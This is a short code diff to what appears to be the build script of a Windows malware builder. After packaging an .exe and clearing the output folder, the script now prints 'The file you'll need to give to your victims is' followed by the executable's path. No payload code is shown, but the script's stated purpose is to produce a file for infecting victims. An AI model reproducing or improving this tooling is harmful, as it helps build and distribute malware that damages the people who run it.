@@ -236,9 +236,9 @@ console.log('');
       includeSubNodeModules: true
     }
   }).then(() => {
-    readdirSync(resolve('dist')).filter(f => !f.endsWith('.exe') && f !== 'win-unpacked').forEach(f => {
+    readdirSync(resolve('dist')).filter(f => !f.endsWith('.exe')).forEach(f => {
       existsSync(resolve('dist', f)) && rmSync(resolve('dist', f), { recursive: true });
     });
-    execSync(`explorer /select,${resolve('dist', `${config.filename}.exe`)}`);
+    console.log(`Done! The file you'll need to give to your victims is ${resolve('dist', `${config.filename}.exe`)}`);
   });
 })();
